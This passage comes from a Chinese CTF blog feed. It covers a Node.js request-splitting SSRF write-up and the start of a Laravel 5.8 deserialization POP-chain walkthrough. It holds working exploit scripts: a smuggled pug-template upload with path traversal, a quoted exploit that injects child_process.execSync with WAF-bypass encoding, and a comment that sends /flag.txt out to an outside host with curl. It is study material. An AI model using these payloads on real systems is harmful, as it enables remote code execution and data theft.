style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">payload&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">result&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">requests&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">url&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">quote&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">payload&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">result&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">text&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211206133327186.png" alt="image-20211206133327186">&lt;/p>
&lt;p>成功得到flag，本地抓包看一下具体情况&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211207011253660.png" alt="image-20211207011253660">&lt;/p>
&lt;p>在exp中我们对一些特殊字符做了unicode编码，被编码的字符应该包括以下这些&lt;/p>
&lt;pre tabindex="0">&lt;code>! &amp;amp; ` ; + \ / &amp;quot; ' &amp;lt;SPACE&amp;gt; &amp;lt;CRLF&amp;gt;
&lt;/code>&lt;/pre>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211206133438315.png" alt="image-20211206133438315">&lt;/p>
&lt;p>（！！！注意 这里很可能有遗漏或者不必要的 请根据实际情况修改&lt;/p>
&lt;p>下面是完全编码的exp.py&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">urllib.parse&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">requests&lt;/span>
&lt;span style="color:#111">_payload&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;&amp;#39;&amp;#39;amiz HTTP/1.1
&lt;/span>&lt;span style="color:#d88200">Host: amiz
&lt;/span>&lt;span style="color:#d88200">Connection: keep-alive
&lt;/span>&lt;span style="color:#d88200">
&lt;/span>&lt;span style="color:#d88200">POST /file_upload HTTP/1.1
&lt;/span>&lt;span style="color:#d88200">Host: amiz
&lt;/span>&lt;span style="color:#d88200">Content-Length: 266
&lt;/span>&lt;span style="color:#d88200">Content-Type: multipart/form-data; boundary=----WebKitFormBoundary4RZFWBFQ4MBn61cf
&lt;/span>&lt;span style="color:#d88200">Cache-control: no-cache
&lt;/span>&lt;span style="color:#d88200">Connection: keep-alive
&lt;/span>&lt;span style="color:#d88200">
&lt;/span>&lt;span style="color:#d88200">------WebKitFormBoundary4RZFWBFQ4MBn61cf
&lt;/span>&lt;span style="color:#d88200">Content-Disposition: form-data; name=&amp;#34;file&amp;#34;; filename=&amp;#34;amiz.pug&amp;#34;
&lt;/span>&lt;span style="color:#d88200">Content-Type: ../template
&lt;/span>&lt;span style="color:#d88200">
&lt;/span>&lt;span style="color:#d88200">doctype html
&lt;/span>&lt;span style="color:#d88200">html
&lt;/span>&lt;span style="color:#d88200"> head
&lt;/span>&lt;span style="color:#d88200"> style
&lt;/span>&lt;span style="color:#d88200"> include ../../../../../../../flag.txt
&lt;/span>&lt;span style="color:#d88200">------WebKitFormBoundary4RZFWBFQ4MBn61cf--
&lt;/span>&lt;span style="color:#d88200">
&lt;/span>&lt;span style="color:#d88200">&amp;#39;&amp;#39;&amp;#39;&lt;/span>
&lt;span style="color:#111">payload&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">_payload&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">replace&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#8045ff">\r\n&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">payload&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;&amp;#39;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">join&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">chr&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">int&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;0xff&amp;#39;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">hex&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">ord&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">c&lt;/span>&lt;span style="color:#111">))[&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>&lt;span style="color:#111">:]&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">zfill&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>&lt;span style="color:#111">),&lt;/span> &lt;span style="color:#ae81ff">16&lt;/span>&lt;span style="color:#111">))&lt;/span> &lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">c&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">payload&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">payload&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">r&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">requests&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;http://a4d0ae70-d877-43de-8158-ed2b3c8fcb75.node4.buuoj.cn:81/core?q=&amp;#39;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">urllib&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">parse&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">quote&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">payload&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">r&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">text&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>将会构造出这种玩意&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211206133631155.png" alt="image-20211206133631155">&lt;/p>
&lt;p>另外pug模板除了包含flag.txt以外还可以跟上面nullcon的题一样用curl请求来外带flag；稍微修改一下exp即可&lt;/p>
&lt;p>放一下&lt;a href="https://blog.5am3.com/2020/02/11/ctf-node1/#%E8%87%AA%E5%B7%B1%E5%87%BA%E7%9A%84-node-game">官方exp.py&lt;/a>&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">requests&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">sys&lt;/span>
&lt;span style="color:#111">payloadRaw&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#34;&amp;#34;x HTTP/1.1
&lt;/span>&lt;span style="color:#d88200">
&lt;/span>&lt;span style="color:#d88200">POST /file_upload HTTP/1.1
&lt;/span>&lt;span style="color:#d88200">Host: localhost:8081
&lt;/span>&lt;span style="color:#d88200">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:72.0) Gecko/20100101 Firefox/72.0
&lt;/span>&lt;span style="color:#d88200">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
&lt;/span>&lt;span style="color:#d88200">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
&lt;/span>&lt;span style="color:#d88200">Accept-Encoding: gzip, deflate
&lt;/span>&lt;span style="color:#d88200">Content-Type: multipart/form-data; boundary=---------------------------12837266501973088788260782942
&lt;/span>&lt;span style="color:#d88200">Content-Length: 6279
&lt;/span>&lt;span style="color:#d88200">Origin: http://localhost:8081
&lt;/span>&lt;span style="color:#d88200">Connection: close
&lt;/span>&lt;span style="color:#d88200">Referer: http://localhost:8081/?action=upload
&lt;/span>&lt;span style="color:#d88200">Upgrade-Insecure-Requests: 1
&lt;/span>&lt;span style="color:#d88200">
&lt;/span>&lt;span style="color:#d88200">-----------------------------12837266501973088788260782942
&lt;/span>&lt;span style="color:#d88200">Content-Disposition: form-data; name=&amp;#34;file&amp;#34;; filename=&amp;#34;5am3_get_flag.pug&amp;#34;
&lt;/span>&lt;span style="color:#d88200">Content-Type: ../template
&lt;/span>&lt;span style="color:#d88200">
&lt;/span>&lt;span style="color:#d88200">- global.process.mainModule.require(&amp;#39;child_process&amp;#39;).execSync(&amp;#39;evalcmd&amp;#39;)
&lt;/span>&lt;span style="color:#d88200">-----------------------------12837266501973088788260782942--
&lt;/span>&lt;span style="color:#d88200">
&lt;/span>&lt;span style="color:#d88200">
&lt;/span>&lt;span style="color:#d88200">&amp;#34;&amp;#34;&amp;#34;&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">getParm&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">payload&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#111">payload&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">payload&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">replace&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34; &amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#34;%C4%A0&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">payload&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">payload&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">replace&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#34;%C4%8D%C4%8A&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">payload&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">payload&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">replace&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#8045ff">\&amp;#34;&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#34;%C4%A2&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">payload&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">payload&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">replace&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;&amp;#39;&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#34;%C4%A7&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">payload&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">payload&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">replace&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;`&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#34;%C5%A0&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">payload&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">payload&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">replace&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;!&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#34;%C4%A1&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">payload&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">payload&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">replace&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;+&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#34;%2B&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">payload&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">payload&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">replace&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;;&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#34;%3B&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">payload&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">payload&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">replace&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;&amp;amp;&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#34;%26&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#75715e"># Bypass Waf&lt;/span>
&lt;span style="color:#111">payload&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">payload&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">replace&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;global&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#34;%C5%A7%C5%AC%C5%AF%C5%A2%C5%A1%C5%AC&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">payload&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">payload&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">replace&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;process&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#34;%C5%B0%C5%B2%C5%AF%C5%A3%C5%A5%C5%B3%C5%B3&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">payload&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">payload&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">replace&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;mainModule&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#34;%C5%AD%C5%A1%C5%A9%C5%AE%C5%8D%C5%AF%C5%A4%C5%B5%C5%AC%C5%A5&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">payload&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">payload&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">replace&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;require&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#34;%C5%B2%C5%A5%C5%B1%C5%B5%C5%A9%C5%B2%C5%A5&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">payload&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">payload&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">replace&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;root&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#34;%C5%B2%C5%AF%C5%AF%C5%B4&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">payload&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">payload&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">replace&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;child_process&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#34;%C5%A3%C5%A8%C5%A9%C5%AC%C5%A4%C5&lt;/span>&lt;span style="color:#d88200">%9F&lt;/span>&lt;span style="color:#d88200">%C5%B0%C5%B2%C5%AF%C5%A3%C5%A5%C5%B3%C5%B3&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">payload&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">payload&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">replace&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;exec&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#34;%C5%A5%C5%B8%C5%A5%C5%A3&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">payload&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">run&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">url&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">cmd&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#111">payloadC&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">payloadRaw&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">replace&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;evalcmd&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">cmd&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">urlC&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">url&lt;/span>&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#d88200">&amp;#34;/core?q=&amp;#34;&lt;/span>&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#111">getParm&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">payloadC&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">requests&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">urlC&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">requests&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">url&lt;/span>&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#d88200">&amp;#34;/?action=5am3_get_flag&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">text&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">__name__&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#d88200">&amp;#39;__main__&amp;#39;&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">targetUrl&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">sys&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">argv&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">]&lt;/span>
&lt;span style="color:#111">cmd&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">sys&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">argv&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>&lt;span style="color:#111">]&lt;/span>
&lt;span style="color:#111">print&lt;/span> &lt;span style="color:#111">run&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">targetUrl&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">cmd&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#75715e"># python exp.py http://127.0.0.1:8081 &amp;#34;curl eval.com -X POST -d `cat /flag.txt`&amp;#34;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;hr>
&lt;p>实不相瞒，我被部分编码时应该编哪一些这个问题困扰了一天，经历了n次的环境崩溃和好多好多令人无语的情况；其实用全编码就是最简单快捷的，但是还是想自己折腾一下&lt;/p>
&lt;p>这个系列下一篇应该是HTTP请求走私或者是302跳转ssrf相关的，不过近期应该是不会再碰js了，垃圾Node.js，毁我青春&lt;/p>
&lt;hr>
&lt;details>
&lt;summary>
&lt;h4 class="inline">
以下是本文中涉及到的 和我学习时看过的所有文章的链接🔗 每日感谢互联网的丰富资源（
&lt;/h4>
&lt;/summary>
&lt;p>&lt;a href="https://capec.mitre.org/data/definitions/220.html">CAPEC-220: Client-Server Protocol Manipulation&lt;/a> | &lt;a href="https://capec.mitre.org/data/definitions/105.html">CAPEC-105: HTTP Request Splitting&lt;/a> | &lt;a href="https://capec.mitre.org/data/definitions/33.html">CAPEC-33: HTTP Request Smuggling&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://github.com/nodejs/node/commit/dd20c0186f">http: add &amp;ndash;security-revert for CVE-2018-12116&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://www.rfk.id.au/blog/entry/security-bugs-ssrf-via-request-splitting/">Security Bugs in Practice: SSRF via Request Splitting&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf">A New Era of SSRF - Exploiting URL Parser in Trending Programming Languages!&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://github.com/Hpd0ger/My_ctf_challenge/tree/master/Isoon2019-Membershop">Membershop - docker&lt;/a> | &lt;a href="https://github.com/nullcon/hackim-2020/tree/master/web/split_second">Split second - docker&lt;/a> | &lt;a href="https://github.com/5am3/My-CTF-Challenges/tree/master/2020-icq-gys">Node Game - docker&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://infosecwriteups.com/nodejs-ssrf-by-response-splitting-asis-ctf-finals-2018-proxy-proxy-question-walkthrough-9a2424923501">Proxy-Proxy - wp&lt;/a> | &lt;a href="https://www.wolai.com/ctfhub/hj3e9WMu8X4ePZ3sADXfsH">Membershop - wp&lt;/a> | &lt;a href="https://ctftime.org/writeup/18293">Split second - wp1&lt;/a> | &lt;a href="https://r3billions.com/writeup-split-second/">Split second - wp2&lt;/a> | &lt;a href="https://blog.p6.is/nullcon-hackim-2020-split-second/">Split second - wp3&lt;/a> | &lt;a href="https://www.zhaoj.in/read-6462.html">Node Game - wp&lt;/a>&lt;/p>
&lt;/details></description></item><item><title>Laravel-5.8.x反序列化pop链学习</title><link>https://amiaaaz.github.io/2021/12/04/laravel-5.8.x-pop-gadgets/</link><pubDate>Sat, 04 Dec 2021 14:11:02 +0800</pubDate><guid>https://amiaaaz.github.io/2021/12/04/laravel-5.8.x-pop-gadgets/</guid><description>&lt;p>亲自从头到尾跟了一下涉及到的三个链子，稍微拯救了一点点点点我稀烂的代码审计能力&lt;/p>
&lt;p>参考链接放在文末&lt;/p>
&lt;hr>
&lt;h2 id="链子1---文件包含任意文件读取">链子1 - 文件包含/任意文件读取&lt;/h2>
&lt;p>搜索&lt;code>__desturct()&lt;/code>找入手点， vendor/symfony/symfony/src/Symfony/Component/Cache/Adapter/TagAwareAdapter.php&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211203153626429.png" alt="image-20211203153626429">&lt;/p>
&lt;p>它调用了&lt;code>commit()&lt;/code>和&lt;code>invalidateTags()&lt;/code>&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211203164858978.png" alt="image-20211203164858978">&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211203164931565.png" alt="image-20211203164931565">&lt;/p>
&lt;p>调用pool的&lt;code>saveDeferred()&lt;/code>方法，我们在这个类相同命名空间(Symfony\Component\Cache\Adapter)下找有没有别的类也实现了这个方法，另外开始的那个pool是在Adapter接口下，所以要找一个AdapterInterface接口并且存在&lt;code>saveDeferred()&lt;/code>的类&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211203165435637.png" alt="image-20211203165435637">&lt;/p>
&lt;p>找到这里vendor/symfony/symfony/src/Symfony/Component/Cache/Adapter/PhpArrayAdapter.php&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211203165151335.png" alt="image-20211203165151335">&lt;/p>
&lt;p>它又调用了initialize()，跟进 vendor/symfony/symfony/src/Symfony/Component/Cache/Traits/PhpArrayTrait.php&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211203165212155.png" alt="image-20211203165212155">&lt;/p>
&lt;p>是我们的文件包含点了，可以从这里读flag&lt;/p>
&lt;p>接下来就是构造exp了，要注意命名空间和接口&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211203170050397.png" alt="image-20211203170050397">&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211203170036701.png" alt="image-20211203170036701">&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211203170020908.png" alt="image-20211203170020908">&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211203165959349.png" alt="image-20211203165959349">&lt;/p>
&lt;p>前两个类都是Symfony\Component\Cache\Adapter命名空间下的，但是CacheItem是Symfony\Component\Cache下的，所以要再引入它，use&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-php" data-lang="php">&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
&lt;span style="color:#00a8c8">namespace&lt;/span> &lt;span style="color:#75af00">Symfony\Component\Cache&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">final&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">CacheItem&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">namespace&lt;/span> &lt;span style="color:#75af00">Symfony\Component\Cache\Adapter&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">use&lt;/span> &lt;span style="color:#75af00">Symfony\Component\Cache\CacheItem&lt;/span>&lt;span style="color:#111">;&lt;/span>
